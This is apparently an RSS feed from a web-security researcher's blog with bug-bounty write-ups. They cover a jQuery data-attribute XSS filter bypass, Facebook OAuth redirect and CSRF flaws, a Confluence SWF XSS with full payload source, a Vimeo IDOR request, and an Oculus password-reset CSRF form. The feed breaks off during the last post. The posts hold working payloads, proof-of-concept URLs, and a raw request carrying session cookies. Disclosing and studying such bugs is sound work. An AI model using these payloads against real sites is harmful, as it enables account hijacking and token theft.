<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Blog BLog</title>
    <description>Web Application Security enthusiast, breaking things for fun</description>
    <link>http://maradrianbelen.com/</link>
    <atom:link href="http://maradrianbelen.com/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 21 Nov 2016 09:21:12 +0100</pubDate>
    <lastBuildDate>Mon, 21 Nov 2016 09:21:12 +0100</lastBuildDate>
    <generator>Jekyll v3.1.6</generator>
    
      <item>
        <title>Use Unobtrusive scripting in malicious way</title>
        <description>&lt;p&gt;Probably You have experienced a situation which context based XSS payload that composed of javascript command and event handlers and HTML tags such as &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input&amp;gt;&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;form&amp;gt;&lt;/code&gt; are removed by XSS Protection, but not the data-* attributes nor input junk. The XSS Protection only returns some HTML tag (&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;b&amp;gt;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;i&amp;gt;&lt;/code&gt; tags ) and its data-* attributes of XSS payload.&lt;/p&gt;

&lt;h2 id=&quot;unobtrusive-scripting-support-for-jquery&quot;&gt;Unobtrusive scripting support for jQuery&lt;/h2&gt;

&lt;p&gt;Unobtrusive javascript is an approach of separating behavior or javascript from presentation or HTML, jQuery, a javascript framework uses HTML 5 data-* attribute as a way of passing data into javascript.&lt;/p&gt;

&lt;p&gt;Crafted context based XSS payload w/ data-* attribute could allow an attacker to call a limited javascript function. for instance, a data-confirm attribute executes a javascript confirm box.&lt;/p&gt;

&lt;h2 id=&quot;abuse-predefined-data--attributes-of-jquery&quot;&gt;Abuse predefined data-* attributes of Jquery&lt;/h2&gt;

&lt;p&gt;As I said before, javascript and event handlers of context based XSS payload are removed by an XSS Protection but not data-* attributes. Lucky there are predefined data-* attributes that we could use.&lt;/p&gt;

&lt;h3 id=&quot;the-bypass-the-payload-that-could-do-lot-of-actions&quot;&gt;The Bypass: The payload (that could do lot of actions).&lt;/h3&gt;

&lt;p&gt;The XSS Protection would be bypassed through the combination of data-method, data-params, data-URL and data-remote, These data attributes can send an HTTP Request including its CSRF token to the Origin. Forged HTTP Request, an on-site request forgery not cross-site request forgery.&lt;/p&gt;

&lt;p&gt;Just like CSRF attack, The attack can force the user to perform state-changing requests like transferring funds, changing their email address, and so forth. But The HTTP request is coming from the same origin.&lt;/p&gt;

&lt;h3 id=&quot;data-url-and-data-remote-send-ajax-request-to-the-given-url-after-change-event-on-element&quot;&gt;‚Äúdata-url‚Äù and ‚Äúdata-remote‚Äù: Send AJAX request to the given url after change event on element&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;input type=&quot;checkbox&quot; name=&quot;task&quot; id=&quot;task&quot; value=&quot;1&quot; data-url=&quot;/tasks/1&quot; data-remote=&quot;true&quot; data-method=&quot;post&quot;&amp;gt;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;data-params-add-additional-parameters-to-the-request&quot;&gt;‚Äúdata-params‚Äù: Add additional parameters to the request&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a data-remote=&quot;true&quot; data-method=&quot;post&quot; data-params=&quot;param1=Hello+server&quot; href=&quot;/test&quot;&amp;gt;AJAX action with POST request&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag since XSS Protection refuses  &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;input&amp;gt;&lt;/code&gt;,&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;form&amp;gt;&lt;/code&gt; HTML tag, My final payload would be this&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;a data-remote=&quot;true&quot; data-method=&quot;post&quot; href=&quot;https://victim.com/change_email/&quot; data-params=&quot;post_data_param_its_value&quot;&amp;gt;CSRF OF THE WIND&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;When a victim clicks our injected &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag, the browser sends a POST HTTP request including the CSRF token that changes the email address of victim‚Äôs account.&lt;/p&gt;
</description>
        <pubDate>Mon, 25 Jul 2016 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2016-07/Use-Unobtrusive-scripting</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2016-07/Use-Unobtrusive-scripting</guid>
        
        
        <category>XSS</category>
        
        <category>CSRF</category>
        
        <category>Jquery</category>
        
      </item>
    
      <item>
        <title>Profiles Of The Top 7 Bug Hunters From Around the Globe</title>
        <description>&lt;p&gt;&lt;a href=&quot;http://www.darkreading.com/threat-intelligence/-profiles-of-the-top-7-bug-hunters-from-around-the-globe/d/d-id/1326213?utm_content=36349934&amp;amp;utm_medium=social&amp;amp;utm_source=facebook&quot;&gt;http://www.darkreading.com/‚Ä¶&lt;/a&gt;&lt;/p&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;Top #5 based on bugcrowd. The result of deep loneliness üòÅ.‚Ä¶ &lt;a href=&quot;https://t.co/iwC5oQX5uA&quot;&gt;https://t.co/iwC5oQX5uA&lt;/a&gt;&lt;/p&gt;&amp;mdash; adrian:zap:‚ö° (@NUkesec) &lt;a href=&quot;https://twitter.com/NUkesec/status/753055547008675845&quot;&gt;July 13, 2016&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async=&quot;&quot; src=&quot;//platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

</description>
        <pubDate>Thu, 14 Jul 2016 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2016-07/Profiles-Of-The-Top-7-Bug-Hunters-From-Around-the-Globe</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2016-07/Profiles-Of-The-Top-7-Bug-Hunters-From-Around-the-Globe</guid>
        
        
        <category>bug_bounty</category>
        
      </item>
    
      <item>
        <title>Oauth security misconfiguration on facebook</title>
        <description>&lt;blockquote&gt;
  &lt;p&gt;OAuth is an open standard for authorization, commonly used as a way for Internet users to log in to third party websites using their Microsoft, Google, Facebook, Twitter, One Network etc. accounts without exposing their password.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Misconfigured OAuth setting could lead to Account take-over, CSRF attack and Token leakage(code and access token). Visit http://www.oauthsecurity.com for more list of OAUTH attacks. This blog post is about facebook Misconfigured OAuth setting that has a security impact on its users. The bugs were reported, and Facebook had mitigated the bugs Before I disclosed it.&lt;/p&gt;

&lt;h2 id=&quot;quick-jump&quot;&gt;Quick Jump&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;#x01-bypass-moves-oauth-2-redirecturi&quot;&gt;Bypass moves oauth 2 redirect_uri&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#x02---leak-mailchimp-accesstoken-via-open-redirector&quot;&gt;Leak mailchimp access_token via open redirector&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#x03---cross-site-request-forgery-on-oauth-clientsmodifies-victims-spotify-playlist-via-csrf&quot;&gt;Cross-site request forgery on OAuth Clients(Modifies Victim‚Äôs spotify playlist Via CSRF)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;x01-bypass-movesfacebook-aquisition-oauth-2-redirecturi&quot;&gt;0x01-Bypass moves(Facebook Aquisition) oauth 2 redirect_uri&lt;/h2&gt;

&lt;p&gt;I created an OAuth application which registered redirect_url is¬†https://www.google.com/, ¬†so it authorization_uri must not be&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://api.moves-app.com/oauth/v1/authorize?response_type=code&amp;amp;client_id=&amp;lt;client_id&amp;gt;&amp;amp;scope=&amp;lt;scope&amp;gt;&amp;amp;redirect_uri=https//yahoo.com

https://api.moves-app.com/oauth/v1/authorize?response_type=code&amp;amp;client_id=&amp;lt;client_id&amp;gt;&amp;amp;scope=&amp;lt;scope&amp;gt;&amp;amp;redirect_uri=facebook.com &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But when I changed the redirect_uri to this &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.google.com.ph&lt;/code&gt; (appends .ph suffix domain on moves redirect_uri).  Surprisingly, it works :) Besides the redirect_uri can also be bypassed via &lt;code class=&quot;highlighter-rouge&quot;&gt;/../../&lt;/code&gt;. for example, if the redirect_uri is &lt;code class=&quot;highlighter-rouge&quot;&gt;https://www.google.com/app/url&lt;/code&gt; change the redirect_uri to  ` https://www.google.com/app/url/../../ `&lt;/p&gt;

&lt;p&gt;The flaw could be used to leak access_token of victim user to attacker‚Äôs domain.&lt;/p&gt;

&lt;p&gt;According to the OAuth 2 documentation, the redirect_uri must be equal to registered redirect_uri
http://tools.ietf.org/html/rfc6819#page-62&lt;/p&gt;

&lt;h2 id=&quot;x02---leak-mailchimp-accesstoken-via-open-redirector&quot;&gt;0x02 - Leak mailchimp access_token via open redirector&lt;/h2&gt;

&lt;p&gt;Facebook sends email notification about saved link of the user every week. If the user clicks any link in his email notification, the browser will be redirected to facebook.com then redirect to the original link without the use of &lt;a href=&quot;https://m.facebook.com/notes/facebook-security/link-shim-protecting-the-people-who-use-facebook-from-malicious-urls/10150492832835766/&quot;&gt;Facebook linkshim&lt;/a&gt;. It seems this is an Open redirector bug.¬†&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://www.facebook.com/saved/redirect/?user_id=100000169908395&amp;amp;object_id=1007549219269324&amp;amp;surface=saved_email_reminder&amp;amp;mechanism=clickable_content&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;¬†The vulnerable parameter is &lt;code class=&quot;highlighter-rouge&quot;&gt;object_id&lt;/code&gt;, we can get the &lt;code class=&quot;highlighter-rouge&quot;&gt;object_id&lt;/code&gt; in¬†https://www.facebook.com/saved/?cref=38¬†when we use using this endpoint¬†&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://www.facebook.com/timeline/app/collection/item/curation/(used to delete saved link).&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;

&lt;p&gt;In the exploitation part, I used the open
redirect of facebook to leak access_token of MailChimp OAuth. Facebook Ads
Manager &lt;a href=&quot;https://www.facebook.com/ads/manage/?act=109060336&quot;&gt;https://www.facebook.com/ads/manage/?act=109060336&lt;/a&gt; can import
MailChimp  customer data by using OAuth 2. I have found there is no
restriction of &lt;em&gt;redirect_uri&lt;/em&gt; value in MailChimp OAuth (Covert Open redirect), so we can abuse the
open redirect vulnerability of facebook to leak the access_token of the victim user.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step of Reproduction&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Go to your profile then post a link (link to malicious site)&lt;/li&gt;
  &lt;li&gt;save the link by clicking the dropdown button on upper right of a post then click the &lt;code class=&quot;highlighter-rouge&quot;&gt;save link&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;now you need to use your &lt;code class=&quot;highlighter-rouge&quot;&gt;user_id&lt;/code&gt; and the &lt;code class=&quot;highlighter-rouge&quot;&gt;object_id&lt;/code&gt; of the link.&lt;/li&gt;
  &lt;li&gt;The final open redirect PoC must be&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;  https://www.facebook.com/saved/redirect/?user_id=100000169908395&amp;amp;object_id=910603298986679&amp;amp;surface=saved_email_reminder&amp;amp;mechanism=clickable_content &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Use the &lt;code class=&quot;highlighter-rouge&quot;&gt;final open redirect PoC&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;redirect_uri&lt;/code&gt; of mailchimp oauth 2 
i.e.&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://login.mailchimp.com/oauth2/authorize?response_type=token&amp;amp;client_id=112041070777&amp;amp;redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fsaved%2Fredirect%2F%3Fuser_id%3D100000169908395%26object_id%3D910603298986679%26surface%3Dsaved_email_reminder%26mechanism%3Dclickable_content &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;!--**video demo:** [facebook_oauth bug_x264_Segment_0_x264.mp4](https://trello-attachments.s3.amazonaws.com/55f04e12c197829570241a4c/57370b657cf0a4155fa203af/df77f826434f5d54984d70296dba29dd/facebook_oauth_bug_x264_Segment_0_x264.mp4)
--&gt;
&lt;p&gt;&lt;strong&gt;Video Demostration&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;video-container&quot;&gt;
&lt;iframe width=&quot;480&quot; height=&quot;360&quot; src=&quot;https://www.youtube.com/embed/t3LUQTcJ-ZA&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;
&lt;/div&gt;

&lt;h2 id=&quot;x03---cross-site-request-forgery-on-oauth-clientsmodifies-victims-spotify-playlist-via-csrf&quot;&gt;0x03 - Cross-site request forgery on OAuth Clients(Modifies Victim‚Äôs spotify playlist Via CSRF),&lt;/h2&gt;

&lt;p&gt;Facebook user can embed a spotify playlist on his facebook timeline by posting a spotify link such as this one&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://play.spotify.com/album/31d6jaMCDe28dAmBv63bBY,&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;on that embedded playlist, user has an option to add that playlist on his spotify account by using oauth 2, facebok uses spotify oauth 2 to do that action.&lt;/p&gt;

&lt;p&gt;I have found that facebook uses the spotify oauth 2 without using the state parameter of the oauth, according to OAuth 2.0 Threat Model and Security Considerations and spotify oauth documentation, the state parameter is used to prevent CSRF attack on oauth(see http://tools.ietf.org/html/rfc6819#section-3.6¬†and https://developer.spotify.com/web-api/authorization-guide/¬†-‚ÄòYour application requests authorization‚Äô). Because there is not csrf protection malicious user could make a csrf attack against facebook that updates victim‚Äôs playlist.&lt;/p&gt;

&lt;h3 id=&quot;hack-steps&quot;&gt;Hack Steps&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;post the link on your timeline&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://play.spotify.com/album/31d6jaMCDe28dAmBv63bBY) &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;to generate the embbed playlist then copy the authorization url of spotify. This is  the authorization url of spotify that uses by facebook&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://accounts.spotify.com/en/authorize?client_id=9cc4aaeb43f24b098cff096385f00233&amp;amp;response_type=code&amp;amp;redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fmusic%2Fspotify%2Fauth%2F&amp;amp;scope=user-library-modify+user-library-read&amp;amp;show_dialog=true &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;now removed the &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;show_dialog=true&lt;/code&gt; parameter of the authorization url so the final url will be¬†&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; https://accounts.spotify.com/en/authorize?client_id=9cc4aaeb43f24b098cff096385f00233&amp;amp;response_type=code&amp;amp;redirect_uri=https%3A%2F%2Fwww.facebook.com%2Fmusic%2Fspotify%2Fauth%2F&amp;amp;scope=user-library-modify+user-library-read &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;If the victim visits the PoC link, CSRF will be triggered&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;video Demonstration&lt;/strong&gt;
csrfonouathfacebookandspotify.mp4?dl=0&lt;/p&gt;
</description>
        <pubDate>Sat, 14 May 2016 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2016-05/Ouath_bug_facebook</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2016-05/Ouath_bug_facebook</guid>
        
        
        <category>Info Leakage</category>
        
        <category>OAUTH</category>
        
        <category>facebook</category>
        
      </item>
    
      <item>
        <title>XSS on confluence comment module</title>
        <description>&lt;p&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;02/Jul/2015 3:27 AM&lt;/code&gt; I found a XSS flaw on confluence, https://jira.atlassian.com/browse/CONF-38127&lt;/p&gt;

&lt;p&gt;In confluence comment module, User can upload and embed the swf file in their comment. Confluence is using an &lt;code class=&quot;highlighter-rouge&quot;&gt;atl_token&lt;/code&gt; parameter on GET HTTP request, if the attacker sends the link of .SWF file( the value of src on embed tag) to his victim the malicious SWF file won‚Äôt execute on the victim‚Äôs browser. Every user has atl_token. This is a CSRF protection and XSS protection too. We can bypass this protection by using &lt;code class=&quot;highlighter-rouge&quot;&gt;this.loaderInfo.parameters&lt;/code&gt; in malicious .SWF. &lt;code class=&quot;highlighter-rouge&quot;&gt;this.loaderInfo.parameters.parameter_name&lt;/code&gt; extracts the value of your target parameter, in this case, it &lt;code class=&quot;highlighter-rouge&quot;&gt;is atl_token&lt;/code&gt;. The attacker must also insert a &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag in malicious SWF file then append the extracted atl_token to &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt; tag , so if the victim clicks the link(&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;a&amp;gt;&lt;/code&gt;) in our embed SWF file, the .SWF file will be executed in the victim‚Äôs browser.&lt;/p&gt;

&lt;h2 id=&quot;payload&quot;&gt;Payload&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;package
{
import flash.display.Sprite;
import flash.text.TextFormat;
import flash.text.TextField;
import flash.external.ExternalInterface;

public class Main extends Sprite
{

public function Main()
{
super();
var myFormat:TextFormat = new TextFormat();
myFormat.size = 200;
var xcode:String = this.loaderInfo.parameters.atl_token;
var myText:TextField = new TextField();
myText.width = 1000;
myText.height = 1000;
myText.htmlText = &quot;&amp;lt;font size=\&#39;300px\&#39;&amp;gt; &amp;lt;a target=\&#39;_blank\&#39; href=\&#39;https://pwnie.ninja/confluence/download/attachments/9469955/NewProjectx.swf?atl_token=&quot; + xcode + &quot;&amp;amp;callback=alert\&#39;&amp;gt;CliCK ME&amp;lt;/a&amp;gt; &amp;lt;/font&amp;gt;&quot;;
addChild(myText);
ExternalInterface.call(this.loaderInfo.parameters.callback,&quot;xss&quot;);
}
}
}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2 id=&quot;references&quot;&gt;References:&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://jira.atlassian.com/browse/CONF-38127&quot;&gt;Jira Report&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://stackoverflow.com/questions/6057211/loaderinfo-parameters-in-as3&quot;&gt;Loaderinfo-parameter-in AS3&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 11 May 2016 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2016-05/XSS-on-confluence-comment-module!</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2016-05/XSS-on-confluence-comment-module!</guid>
        
        
        <category>XSS</category>
        
        <category>SWF</category>
        
      </item>
    
      <item>
        <title>Abusing Thumbnails to see Vimeo private video</title>
        <description>&lt;p&gt;https://vimeo.com/upload/select_thumb URL is used to set thumbnails to your Vimeo video. https://vimeo.com/upload/select_thumb URL request is composed of 3 parameter clip_id, token, and time. clip_id parameter is used to select a video you want to get a thumbnail, the token is an anti-CSRF token and time parameter is the time frame of the video you selected.&lt;/p&gt;

&lt;p&gt;I changed the value of clip_id parameter to another video id to test some authorization flaw, it seems, it works because I got HTTP/1.1 200 OK and I short JSON response that contains a URL, like this one&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;503302458&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;url&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;https:\/\/i.vimeocdn.com\/video\/503302458_100x75.jpg&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To confirm this is an authorization flaw, I make an another account and upload a private video on that account and get the clip_id then make an HTTP request (https://vimeo.com/upload/select_thumb) to my attacker account using that clip_id. as a result, I got some thumbnails on a private video.&lt;/p&gt;

&lt;p&gt;To get the whole video just iterate the time parameter!&lt;/p&gt;

&lt;h2 id=&quot;http-request-of-vulnerable-endpoint&quot;&gt;HTTP Request of vulnerable endpoint&lt;/h2&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;POST /upload/select_thumb HTTP/1.1
Host: vimeo.com
Connection: keep-alive
Content-Length: 101
Accept: application/json
Origin: https://vimeo.com
X-Requested-With: XMLHttpRequest
X-Request: JSON
User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Content-type: application/x-www-form-urlencoded; charset=UTF-8
DNT: 1
Referer: https://vimeo.com/116730756/settings
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.8,et;q=0.6,fil;q=0.4
Cookie: optimizelyEndUserId=oeu1421174571879r0.30598339810967445; vimeo_cart=%7B%22pro%22%3A%7B%22store%22%3A%22pro%22%2C%22version%22%3A1%2C%22quantities%22%3A%7B%22433857%22%3A1%7D%2C%22items%22%3A%5B%7B%22id%22%3A433857%7D%5D%2C%22currency%22%3A%22USD%22%2C%22attributes%22%3A%5B%5D%7D%7D; ki_t=1421174596820%3B1421174596820%3B1421174632154%3B1%3B2; ki_r=; optimizelySegments=%7B%22198520930%22%3A%22direct%22%2C%22199004622%22%3A%22gc%22%2C%22199138489%22%3A%22false%22%2C%22213082152%22%3A%22none%22%2C%22222271074%22%3A%22true%22%7D; optimizelyBuckets=%7B%7D; language=en; clips=116730756%2C116213689; auto_load_stats=1; has_logged_in=1; stats_start_date=2015%2F01%2F11; stats_end_date=2015%2F01%2F15; site_settings=%7B%22sticky_page%22%3A%22%5C%2Fmyvideos%22%2C%22browse_format_vid%22%3A%22video%22%7D; stream_id=Y2xpcHM6MzYzNzIzODc6aWQ6ZGVzYzpbXQ%3D%3D; stream_pos=1; orphaned_upload_clip_ids_v2=%5B116730663%2C116730664%5D; vuid=971609171.1881657208; _utma=18302654.1379178336.1421173781.1421184208.1421253399.5; _utmb=18302654.28.9.1421253997197; __utmc=18302654; __utmz=18302654.1421174705.2.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); _utmv=18302654.|2=usertype=basic=1^3=ms=0=1^7=video_count=0=1; vimeo=epk9krxkmr70pcdxcxxsctd7jpcdxcxmkxrx7%2Cpfftk0tftdd0fdcmvx9x92rmksckx5rrfww5dwrvv; player=&quot;&quot;; xsrft=d816974227fe3684c41a8501f333679f.61b1f2e5e1df9aeb29e02acf641d99a9

clip_id=9digitid&amp;amp;token=TOKEN_HERE&amp;amp;time=51.283&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;Original Report:&lt;/strong&gt; &lt;a href=&quot;https://hackerone.com/reports/43850&quot;&gt;Hackerone&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Wed, 11 May 2016 00:00:00 +0200</pubDate>
        <link>http://maradrianbelen.com/articles/2016-05/IDOR-onVimeo</link>
        <guid isPermaLink="true">http://maradrianbelen.com/articles/2016-05/IDOR-onVimeo</guid>
        
        
        <category>IDOR</category>
        
        <category>Privacy</category>
        
      </item>
    
      <item>
        <title>OCULUS VR account hijacking via password reset vulnerability</title>
        <description>&lt;p&gt;Oculus VR is a virtual reality technology company founded by Brendan Iribe and Palmer Luckey. Their first product, still in development, is the Oculus Rift, a head-mounted display for immersive virtual reality(VR). In March 2014,Facebook agreed to acquire Oculus VR for US$2 billion in cash and Facebook stock.&lt;/p&gt;

&lt;p&gt;While testing the forgot password functionality of oculusVR. I have found that it‚Äôs possible to abuse this functionality.
Here is a algorithm how the reset password functionality of oculus VR works.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;if (user is log in){
//the app will not use auth parameter which is a reset password passcode. Then change the password of the user who is currently log in.

}
else{
//if the user is not log in ,oculus uses the auth parameter to identify which account to be reset.

}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://4.bp.blogspot.com/-tAuAQSsCwO4/U_LD_b0AOnI/AAAAAAAAAQs/hotORflSwzY/s1600/check1.png&quot; alt=&quot;passw&quot; /&gt;
&lt;em&gt;Although I am log in, password reset page still can be viewed.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The main problem here is oculusVR does not have an ANTI-CSRF token on reset password functionality. :) the only need to hijack an oculusVR account is an attacker reset password link token. Combining the CSRF vulnerability and weird behavior of password reset page will be resulted in &lt;strong&gt;Account Hijacking vulnerability&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;sample-csrf-poc&quot;&gt;Sample CSRF PoC&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;body&amp;gt;
&amp;lt;form action=&quot;https://developer.oculusvr.com/core/UserAction.php&quot; method=&quot;POST&quot;&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;changepassword&quot; /&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;auth&quot; value=&quot;your_reset_token&quot; /&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;newpassword&quot; value=&quot;attackerpassword&quot; /&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;confirmpassword&quot; value=&quot;attackerpassword&quot; /&amp;gt;
&amp;lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To get the value of auth parameter you must request a reset password link on this link https://developer.oculusvr.com/lostpassword.&lt;/p&gt;

&lt;h3 id=&quot;hack-steps&quot;&gt;HACK STEPS&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Attacker requests a reset password link&lt;/li&gt;
  &lt;li&gt;Makes a CSRF PoC attack with reset token&lt;/li&gt;
  &lt;li&gt;Sends the CSRF PoC link to his victim&lt;/li&gt;
